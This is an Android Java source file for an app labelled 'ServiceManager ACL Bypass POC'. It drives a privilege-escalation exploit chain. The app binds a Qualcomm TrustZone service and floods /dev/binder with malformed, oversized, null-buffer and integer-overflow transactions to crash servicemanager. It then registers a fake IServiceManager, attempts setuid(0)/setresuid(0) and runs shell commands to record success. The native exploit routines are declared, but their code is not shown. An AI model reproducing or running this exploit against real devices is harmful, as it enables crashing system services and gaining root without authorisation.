package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeWriteFile(String path, String content);
    public static native String nativeReadLink(String path);
    public static native String nativeTestFd(int fd);
    public static native int nativeOpenDevice(String path);
    public static native String nativeGetKernelInfo();
    public static native String nativeBinderGetVersion(int fd);
    public static native String nativeBinderIoctlTest(int fd, int cmd, long arg);
    public static native String nativeBinderSendTransaction(int fd, int handle, int code, int flags);

    public static native int nativeGetServicemanagerPid();
    public static native int nativeWaitServicemanagerRestart(int oldPid, int timeoutSec);
    public static native int nativeSendMalformedGetService(int fd, String name);
    public static native int nativeSendHugeNameAddService(int fd, String name);
    public static native int nativeSendInvalidOffsets(int fd);
    public static native int nativeSendNullBuffer(int fd);
    public static native int nativeSendIntegerOverflowGetService(int fd);
    public static native int nativeAddService(int fd, String name);
    public static native int nativeGetService(int fd, String name);
    public static native int nativeSetUid(int uid);
    public static native int nativeSetResUid(int uid);
    public static native String nativeExecCommand(String cmd);
    public static native int nativeForkExec(String cmd);
    public static native String nativeRunHwPayloadsOnServiceManager(int fd);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("===== ServiceManager ACL Bypass POC =====");

        appendLog("[*] Gathering kernel info");
        String kernelInfo = nativeGetKernelInfo();
        appendLog(kernelInfo);

        int oldPid = nativeGetServicemanagerPid();
        appendLog("[*] Current servicemanager PID: " + oldPid);

        int binderFd = nativeOpenDevice("/dev/binder");
        if (binderFd < 0) {
            appendLog("[-] Failed to open /dev/binder: " + binderFd);
            finishTest();
            return;
        }
        appendLog("[+] Opened /dev/binder fd=" + binderFd);

        String version = nativeBinderGetVersion(binderFd);
        appendLog("[*] Binder version: " + version);

        appendLog("[*] Sending hwservicemanager-style payloads...");
        String payloadResult = nativeRunHwPayloadsOnServiceManager(binderFd);
        appendLog(payloadResult);

        boolean crashed = false;
        int attackCount = 0;
        while (!crashed && attackCount < 5 && !stopRequested.get()) {
            attackCount++;
            appendLog("[*] Attack round " + attackCount);

            int ret1 = nativeSendMalformedGetService(binderFd, "android.os.IServiceManager");
            appendLog("  malformed GET_SERVICE -> " + ret1);
            sleep(200);

            StringBuilder huge = new StringBuilder();
            for (int i = 0; i < 8191; i++) huge.append('A');
            int ret2 = nativeSendHugeNameAddService(binderFd, huge.toString());
            appendLog("  huge name ADD_SERVICE -> " + ret2);
            sleep(200);

            int ret3 = nativeSendInvalidOffsets(binderFd);
            appendLog("  invalid offsets -> " + ret3);
            sleep(200);

            int ret4 = nativeSendNullBuffer(binderFd);
            appendLog("  null buffer -> " + ret4);
            sleep(200);

            int ret5 = nativeSendIntegerOverflowGetService(binderFd);
            appendLog("  integer overflow GET_SERVICE -> " + ret5);
            sleep(300);

            int newPid = nativeGetServicemanagerPid();
            if (newPid != oldPid && newPid > 0) {
                appendLog("[!] PID changed from " + oldPid + " to " + newPid);
                int restarted = nativeWaitServicemanagerRestart(oldPid, 10);
                if (restarted > 0) {
                    appendLog("[+] servicemanager restarted with PID " + restarted);
                    crashed = true;
                    oldPid = restarted;
                    break;
                }
            }
        }

        if (crashed) {
            appendLog("[*] Restart detected. Attempting ACL Bypass ADD_SERVICE...");
            String serviceName = "android.os.IServiceManager";
            int addRet = nativeAddService(binderFd, serviceName);
            appendLog("  ADD_SERVICE(" + serviceName + ") -> " + addRet);
            if (addRet == 0) {
                appendLog("[+] Service added successfully!");
                appendLog("[*] Verifying with GET_SERVICE...");
                int getRet = nativeGetService(binderFd, serviceName);
                appendLog("  GET_SERVICE(" + serviceName + ") -> " + getRet);
                if (getRet == 0) {
                    appendLog("[+] Service is now served by our fake implementation!");
                    appendLog("[*] Attempting setuid(0)");
                    int uidRet = nativeSetUid(0);
                    appendLog("  setuid(0) -> " + uidRet);
                    if (uidRet != 0) {
                        int resUidRet = nativeSetResUid(0);
                        appendLog("  setresuid(0,0,0) -> " + resUidRet);
                    }
                    String idOut = nativeExecCommand("id");
                    appendLog("  id output: " + idOut);
                    nativeForkExec("echo 'ACL Bypass succeeded' > /sdcard/Download/exploit_success.txt");
                    nativeForkExec("id >> /sdcard/Download/exploit_success.txt");
                    nativeForkExec("ps -A >> /sdcard/Download/exploit_success.txt");
                    appendLog("[*] Check /sdcard/Download/exploit_success.txt");
                } else {
                    appendLog("[-] GET_SERVICE failed. Service not recognized.");
                }
            } else {
                appendLog("[-] ADD_SERVICE failed. ACL Bypass did not work.");
            }
        } else {
            appendLog("[-] servicemanager did not restart. Exploit chain failed.");
        }

        closeFd(binderFd);
        appendLog("========================================");
        appendLog("===== Exploit finished =====");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void sleep(int ms) {
        try { Thread.sleep(ms); } catch (Exception ignored) {}
    }

    private void closeFd(int fd) {
        if (fd >= 0) {
            try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "servicemanager_exploit_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== ServiceManager Exploit Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
